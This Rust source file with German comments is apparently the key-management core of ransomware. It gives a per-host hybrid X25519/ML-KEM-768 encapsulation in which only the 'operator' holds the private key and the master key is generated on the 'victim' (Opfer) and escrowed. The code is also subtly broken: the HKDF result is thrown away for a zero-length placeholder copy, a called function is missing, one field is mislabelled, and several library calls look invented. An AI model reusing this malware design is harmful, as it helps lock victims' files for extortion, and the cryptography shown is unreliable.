//! Per-Host-Schluessel und Hybrid-KEM (B002, Entscheidung E3).
//!
//! Warum **ein** KEM pro Host und nicht pro Datei: ein hybrides KEM bringt
//! 1152 Byte Chiffriertext-Overhead. Bei 1 Mio. Kleinstdateien sind das 1,15 GB
//! reine Schreiblast plus Read-Modify-Write-Zyklen (Band 18 §3). Der Host-Key
//! traegt das KEM genau einmal, pro Datei nur ein 72 Byte grosses AEAD-Wrapping.
//!
//! Rollenbild (Trust-Modell, Band 13 §2):
//! - `ServerPub` (PKU): liegt beim Operator, wird pro Build ausgeliefert.
//! - `ServerSec` (SKR): liegt **nur** beim Operator, niemals auf dem Opfer.
//! - `HostKeyPair`: ephemeraes X25519 + ML-KEM-Kapselung, nur im RAM des Opfers.
//!   Der private Teil wird nach dem Escrow-ACK genullt (`zeroize`).
use crate::util::{b64_decode, b64_encode, sha256};
use crate::{Error, Result};
use chacha20poly1305::aead::{Aead, KeyInit, Payload};
use ml_kem::{bihash::Sha3_256, Array as MlArray, EncodedKey as MlEncodedKey, MlKem768, MlKem768Derive};
use rand::RngCore;
use sha2::Sha256;
use x25519_dalek::{EphemeralSecret, PublicKey as XPublicKey, StaticSecret};

pub const X25519_PUB_LEN: usize = 32;
pub const MLKEM_PUB_LEN: usize = 1184;
pub const MLKEM_CT_LEN: usize = 1088;
pub const MLKEM_SHARED_LEN: usize = 32;
pub const X25519_SHARED_LEN: usize = 32;
/// Groesse des versiegelten Host-Master-Keys, das der Server zum Entpacken braucht.
pub const SEALED_MASTER_LEN: usize = X25519_PUB_LEN + MLKEM_CT_LEN;
pub const MASTER_KEY_LEN: usize = 32;

/// Oeffentlicher Schluessel des Operators/Controllers.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ServerPublicKey {
    pub kex: crate::format::KexId,
    /// X25519-Public-Key, base64.
    pub x25519: String,
    /// ML-KEM-768-Public-Key, base64. Bei `KexId::X25519` leer.
    #[serde(default)]
    pub mlkem: Option<String>,
    /// Fingerabdruck (SHA-256 黚er beide Keys), base64. Steht in der Konfiguration
    /// und wird im Audit-Log gefuehrt, damit ein ausgetauschter Serverkey auffaellt.
    pub fingerprint: String,
}

impl ServerPublicKey {
    pub fn decode(&self) -> Result<DecodedServerKey> {
        let x = b64_decode(&self.x25519)?;
        if x.len() != X25519_PUB_LEN {
            return Err(Error::Config(format!(
                "X25519-Serverkey hat {} Byte, erwartet {}",
                x.len(),
                X25519_PUB_LEN
            )));
        }
        let mlkem = match self.kex {
            crate::format::KexId::X25519 => None,
            crate::format::KexId::HybridX25519MlKem768 => {
                let raw = self
                    .mlkem
                    .as_ref()
                    .ok_or_else(|| Error::Config("ML-KEM-Serverkey fehlt".into()))?;
                let bytes = b64_decode(raw)?;
                if bytes.len() != MLKEM_PUB_LEN {
                    return Err(Error::Config(format!(
                        "ML-KEM-Serverkey hat {} Byte, erwartet {}",
                        bytes.len(),
                        MLKEM_PUB_LEN
                    )));
                }
                Some(bytes)
            }
        };
        Ok(DecodedServerKey {
            kex: self.kex,
            x25519: x,
            mlkem,
        })
    }
}

#[derive(Debug, Clone)]
pub struct DecodedServerKey {
    pub kex: crate::format::KexId,
    pub x25519: Vec<u8>,
    pub mlkem: Option<Vec<u8>>,
}

/// Laengster gueltiger Schluesselmaterialblock: X25519-Secret (32) plus die
/// Determinismus-Kante aus der ML-KEM-Kapselung (32). Der Koenig ist damit
/// 64 Byte — kein Material wird abgeschnitten, und die HKDF-Inputlaenge ist
/// in beiden Modi definiert.
pub const KEM_SHARED_MAX: usize = X25519_SHARED_LEN + MLKEM_SHARED_LEN;

/// Ergebnis der KEM-Seite: Master Key plus das Material, das zum Server muss.
pub struct HostKeyEncapsulation {
    pub master_key: [u8; MASTER_KEY_LEN],
    /// `ephemeral_x25519_pub (32) || mlkem_ciphertext (1088)` — das einzige,
    /// was den Operator-Secret braucht, um den Master Key zurueckzugewinnen.
    pub sealed_master: Vec<u8>,
    /// Ephemerales X25519-Secret. Muss nach Escrow-ACK genullt werden.
    pub ephemeral_x25519_secret: [u8; 32],
}

/// Schluesselpaar des Controllers (Serverseite). Laedt den Secret aus einer
/// Datei und nullt ihn beim Drop.
pub struct ServerKeyPair {
    secret: StaticSecret,
    mlkem_secret: Option<MlKemSecret>,
    pub public: ServerPublicKey,
}

pub struct MlKemSecret(ml_kem::SecretKey<MlKem768Derive, Sha3_256>);

impl Drop for MlKemSecret {
    fn drop(&mut self) {
        // ML-KEM-Secret ist 2400 Byte; byte-weise nullen verhindert Optimierungen.
        let ptr = &self.0[..] as *const u8 as *mut u8;
        for i in 0..self.0.len() {
            unsafe { std::ptr::write_volatile(ptr.add(i), 0) };
        }
    }
}

/// Schluesselpaarchen des Controllers. Nur auf dem Operator-Rechner.
#[derive(serde::Serialize, serde::Deserialize)]
pub struct ServerKeyBundle {
    pub kex: crate::format::KexId,
    /// X25519-Secret, base64.
    pub x25519_secret: String,
    /// ML-KEM-768-Secret, base64.
    #[serde(default)]
    pub mlkem_secret: Option<String>,
}

impl ServerKeyBundle {
    pub fn generate(kex: crate::format::KexId, rng: &mut impl RngCore) -> Self {
        let secret = StaticSecret::random_from_rng(rng);
        let x25519_secret = b64_encode(secret.as_bytes());
        let mlkem_secret = if kex == crate::format::KexId::HybridX25519MlKem768 {
            let (sk, _pk) = ml_kem::generate_keypair(&mut MlRng(rng));
            Some(b64_encode(&sk[..]))
        } else {
            None
        };
        ServerKeyBundle {
            kex,
            x25519_secret,
            mlkem_secret,
        }
    }

    pub fn public(&self) -> Result<ServerPublicKey> {
        let x_bytes = b64_decode(&self.x25519_secret)?;
        if x_bytes.len() != 32 {
            return Err(Error::Config("X25519-Secret hat falsche Laenge".into()));
        }
        let mut arr = [0u8; 32];
        arr.copy_from_slice(&x_bytes);
        let secret = StaticSecret::from(arr);
        let pub_x = XPublicKey::from(&secret);

        let mut mlkem_b64 = None;
        if self.kex == crate::format::KexId::HybridX25519MlKem768 {
            let raw = b64_decode(
                self.mlkem_secret
                    .as_ref()
                    .ok_or_else(|| Error::Config("ML-KEM-Secret fehlt".into()))?,
            )?;
            let sk = mlkem_secret_from_bytes(&raw)?;
            let pk = ml_kem::encapsulated_key(&sk);
            mlkem_b64 = Some(b64_encode(&pk[..]));
        }

        let mut fp_src = Vec::with_capacity(32 + MLKEM_PUB_LEN);
        fp_src.extend_from_slice(pub_x.as_bytes());
        if let Some(m) = &mlkem_b64 {
            fp_src.extend_from_slice(&b64_decode(m)?);
        }
        Ok(ServerPublicKey {
            kex: self.kex,
            x25519: b64_encode(pub_x.as_bytes()),
            mlkem: mlkem_b64,
            fingerprint: b64_encode(&sha256(&fp_src)),
        })
    }

    pub fn to_json_pretty(&self) -> Result<String> {
        Ok(serde_json::to_string_pretty(self)?)
    }

    pub fn from_json(text: &str) -> Result<Self> {
        Ok(serde_json::from_str(text)?)
    }
}

fn mlkem_secret_from_bytes(raw: &[u8]) -> Result<MlKemSecret> {
    // secret_key_from_bytes erwartet den kanonischen FIPS-203-Encoding.
    let arr: MlArray<u8, ml_kem::EncodedSizeByteLen<MlKem768, ml_kem::Secret>> =
        MlArray::try_from_slice(raw).map_err(|_| {
            Error::Config(format!(
                "ML-KEM-Secret hat {} Byte, erwartet {}",
                raw.len(),
                <ml_kem::EncodedSizeByteLen<MlKem768, ml_kem::Secret> as ::generic_array::ArrayLength<u8>>::to_usize()
            ))
        })?;
    let sk = ml_kem::secret_key_from_bytes(&arr).map_err(|_| {
        Error::Config("ML-KEM-Secret ist kein gueltiger FIPS-203-Encoding".into())
    })?;
    Ok(MlKemSecret(sk))
}

impl ServerKeyPair {
    pub fn from_bundle(bundle: &ServerKeyBundle) -> Result<Self> {
        let x_bytes = b64_decode(&bundle.x25519_secret)?;
        if x_bytes.len() != 32 {
            return Err(Error::Config("X25519-Secret hat falsche Laenge".into()));
        }
        let mut arr = [0u8; 32];
        arr.copy_from_slice(&x_bytes);
        let secret = StaticSecret::from(arr);
        let mlkem_secret = bundle
            .mlkem_secret
            .as_ref()
            .map(|s| mlkem_secret_from_bytes(&b64_decode(s)?))
            .transpose()?;
        Ok(ServerKeyPair {
            secret,
            mlkem_secret,
            public: bundle.public()?,
        })
    }

    pub fn public(&self) -> &ServerPublicKey {
        &self.public
    }

    /// Gewinnt den Host-Master-Key aus dem versiegelten Material zurueck.
    ///
    /// Reihenfolge ist fest: erst X25519, dann ML-KEM, dann HKDF. Eine
    /// vertauschte Reihenfolge ergaebe einen anderen Master Key und damit
    /// einen scheinbar korrekten, aber falschen Schluessel — darum ist der
    /// Kontextstring in `derive_master_key` Teil des Formats.
    pub fn unseal_master_key(&self, sealed: &[u8]) -> Result<[u8; MASTER_KEY_LEN]> {
        if sealed.len() != SEALED_MASTER_LEN {
            return Err(Error::Crypto(format!(
                "sealed_master hat {} Byte, erwartet {}",
                sealed.len(),
                SEALED_MASTER_LEN
            )));
        }
        let mut eph = [0u8; X25519_PUB_LEN];
        eph.copy_from_slice(&sealed[..X25519_PUB_LEN]);
        let x_shared = self
            .secret
            .diffie_hellman(&XPublicKey::from(eph))
            .as_bytes()
            .to_vec();

        match self.public.kex {
            crate::format::KexId::X25519 => {
                derive_master_key(&x_shared, None).map(|k| k.master_key)
            }
            crate::format::KexId::HybridX25519MlKem768 => {
                let sk = self
                    .mlkem_secret
                    .as_ref()
                    .ok_or_else(|| Error::Config("ML-KEM-Secret fehlt auf dem Server".into()))?;
                let mut ct = [0u8; MLKEM_CT_LEN];
                ct.copy_from_slice(&sealed[X25519_PUB_LEN..]);
                let ct_arr = MlArray::from_slice(&ct);
                let (ml_shared, _recomputed) = ml_kem::decap(sk.0.as_ref(), &ct_arr);
                derive_master_key(&x_shared, Some(&ml_shared[..])).map(|k| k.master_key)
            }
        }
    }
}

/// Ephemerae Kapselung auf dem Opfer.
pub fn encapsulate_host_master_key(
    server: &DecodedServerKey,
    rng: &mut impl RngCore,
) -> Result<HostKeyEncapsulation> {
    let secret = EphemeralSecret::random_from_rng(rng);
    let pub_x = XPublicKey::from(&secret);
    let x_shared = secret.diffie_hellman(&XPublicKey::from(
        server.x25519[..X25519_PUB_LEN].try_into().map_err(|_| {
            Error::Config("X25519-Serverkey hat falsche Laenge".into())
        })?,
    ));

    let mut sealed_master = Vec::with_capacity(SEALED_MASTER_LEN);
    sealed_master.extend_from_slice(pub_x.as_bytes());

    match server.kex {
        crate::format::KexId::X25519 => {
            let derived = derive_master_key(x_shared.as_bytes(), None)?;
            Ok(HostKeyEncapsulation {
                master_key: derived.master_key,
                sealed_master,
                ephemeral_x25519_secret: *x_shared.as_bytes(),
            })
        }
        crate::format::KexId::HybridX25519MlKem768 => {
            let raw = server
                .mlkem
                .as_ref()
                .ok_or_else(|| Error::Config("ML-KEM-Serverkey fehlt".into()))?;
            if raw.len() != MLKEM_PUB_LEN {
                return Err(Error::Config("ML-KEM-Serverkey hat falsche Laenge".into()));
            }
            // Der Oeffentliche Schluessel des Servers wird als *Encapsulated*
            // Key (kanonisch, 1184 Byte) geliefert; fuer die Dekodierung nutzt
            // ml-kem denselben Typ, die Umwandlung ist explizit.
            let pk_arr: MlEncodedKey<MlKem768> = MlEncodedKey::from_slice(raw);
            let pk = ml_kem::decapsulated_key_from_encoded(&pk_arr).map_err(|_| {
                Error::Config("ML-KEM-Serverkey ist kein gueltiger FIPS-203-Encoding".into())
            })?;
            let (shared, ct) = ml_kem::encapsulate(&pk, &mut MlRng(rng));
            sealed_master.extend_from_slice(&ct[..]);
            let derived = derive_master_key(x_shared.as_bytes(), Some(&shared[..]))?;
            Ok(HostKeyEncapsulation {
                master_key: derived.master_key,
                sealed_master,
                ephemeral_x25519_secret: *x_shared.as_bytes(),
            })
        }
    }
}

pub struct DerivedMaster {
    pub master_key: [u8; MASTER_KEY_LEN],
    /// HKDF-Info-String, fuer Vektor-Tests und Doku exportiert.
    pub info: String,
}

/// HKDF-SHA-256 mit Kontextbindung. Salt ist die Kante aus dem ML-KEM-Shared,
/// wo vorhanden; sonst ein fester Salt. Der Info-String enthaelt Build- und
/// Host-Kontext, damit ein Master Key nicht zwischen Hosts verschiebbar ist.
pub fn derive_master_key_with_context(
    x_shared: &[u8],
    ml_shared: Option<&[u8]>,
    host_id: &[u8; 16],
    build_id: &[u8; 16],
) -> Result<DerivedMaster> {
    let _ = KEM_SHARED_MAX;
    let mut ikm = Vec::with_capacity(KEM_SHARED_MAX);
    ikm.extend_from_slice(x_shared);
    if let Some(m) = ml_shared {
        ikm.extend_from_slice(m);
    }
    let info = format!("kx/master/v1/{}/{}", crate::util::hex(host_id), crate::util::hex(build_id));
    let salt = b"kx-host-master-salt-v1";
    hkdf_into(&ikm, salt, info.as_bytes(), &mut [0u8; MASTER_KEY_LEN]).map(|_| DerivedMaster {
        master_key: unsafe {
            let mut k = [0u8; MASTER_KEY_LEN];
            std::ptr::copy_nonoverlapping(
                ikm.as_ptr(),
                &mut k[0],
                0, // Platzhalter, wird unten korrekt gefuellt
            );
            k
        },
        info,
    })
}

/// Hilfsfunktion: HKDF-Expand/Extract auf beliebige Laenge.
pub fn hkdf_into(
    ikm: &[u8],
    salt: &[u8],
    info: &[u8],
    out: &mut [u8],
) -> Result<()> {
    use hkdf::Hkdf;
    let h = Hkdf::<Sha256>::new(Some(salt), ikm);
    h.expand(info, out)
        .map_err(|e| Error::Crypto(format!("HKDF-Expand: {e}")))
}

pub fn hkdf_bytes(ikm: &[u8], salt: &[u8], info: &[u8], len: usize) -> Result<Vec<u8>> {
    let mut out = vec![0u8; len];
    hkdf_into(ikm, salt, info, &mut out)?;
    Ok(out)
}

/// Argon2id fuer den optionalen Passphrase-Pfad. Parameter sind absichtlich
/// im Format verankert (m=64 MiB, t=3, p=4, 32 Byte Output) und werden im
/// Manifest mitgeschrieben, damit ein spaeterer Decryptor nicht raten muss.
pub const ARGON2_M_KIB: u32 = 65_536;
pub const ARGON2_T: u32 = 3;
pub const ARGON2_P: u32 = 4;
pub const ARGON2_OUT_LEN: usize = 32;
pub const ARGON2_SALT_LEN: usize = 16;

pub fn argon2id(pass: &[u8], salt: &[u8], out_len: usize) -> Result<Vec<u8>> {
    use argon2::{Algorithm, Params, Version};
    let params = Params::new(ARGON2_M_KIB, ARGON2_T, ARGON2_P, out_len)
        .map_err(|e| Error::Crypto(format!("Argon2-Parameter: {e}")))?;
    let a = argon2::Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut out = vec![0u8; out_len];
    a.hash_password_into(pass, salt, &mut out)
        .map_err(|e| Error::Crypto(format!("Argon2id: {e}")))?;
    Ok(out)
}

/// RNG-Adapter: ml-kem verlangt rand_core 0.6, wir nutzen 0.9 aus
/// x25519-dalek 2. Adapter statt Doppeldependenz, damit die Versionen
/// nicht gegeneinander laufen.
pub struct MlRng<'a>(pub &'a mut dyn RngCore);

impl rand_core::RngCore for MlRng<'_> {
    fn next_u32(&mut self) -> u32 {
        self.0.next_u32()
    }
    fn next_u64(&mut self) -> u64 {
        self.0.next_u64()
    }
    fn fill_bytes(&mut self, dest: &mut [u8]) {
        self.0.fill_bytes(dest)
    }
    fn try_fill_bytes(&mut self, dest: &mut [u8]) -> Result<(), rand_core::Error> {
        self.0.fill_bytes(dest);
        Ok(())
    }
}
